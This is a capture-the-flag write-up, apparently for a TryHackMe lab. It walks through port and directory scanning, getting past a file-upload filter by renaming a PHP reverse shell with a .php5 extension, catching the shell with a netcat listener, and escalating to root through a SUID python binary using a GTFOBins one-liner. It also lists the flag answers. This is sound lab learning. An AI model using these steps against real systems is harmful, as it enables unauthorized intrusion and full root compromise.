First thing I did was enter the IP into a browser. 

'View page source' revealed nothing of interest.

Ran nmap-dirsearch.sh (script in Bash repository)
    Open Ports:
        22
        80
    Directories:
        /js/
        /css/
        /panel/
        /uploads/
        
I navigated to /panel/. There was a field for uploading a file. 
    First tried a php script for a reverse shell.
        phpreverseshell.php - Error uploading
    Then I tried a pdf file to see if anything would upload.
        Uploaded successfully
    So then I tried the php with a modification to the file name.
        phpreverseshell.pdf.php - Error again
    Then I figured I would try the php file again but as a php5
        phpreverseshell.php5 - SUCCESS
        
Navigate to /uploads/. The file is there.

Opened a netcat listener.
    nc -nlvp 4444
    
Ran the script on the web page. - SUCCESS

I searched the target machine for the user.txt file.
    I used - find . -type f -name user.txt
    
I found the file in /var/www/
    flag - THM{y0u_g0t_a_sh3ll}
    
Need to find files with SUID permissions. The hint says, and a quick goggle search confirmed:
    find / -user root -perm /4000
    
The file that looks "weird" or promising is:
    /usr/bin/python
    
We need to find a way to leverage python to escalate privileges.

The hint it gives us is to search gtfobins.
    
On their site there is a section for python. Scroll down to the section for SUID.
    Copied the code and entered it into the target machine.
        ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
        
Check to see if the code worked.
    whoami

It says that I am now root.

Searched for the root.txt file.
    find . -type f -name root.txt
        /root/root.txt
        
Navigated there and read the file to get the final flag.
    cat root.txt
        THM{pr1v1l3g3_3sc4l4t10n}
        
Congratulations!!! Finished!!!!
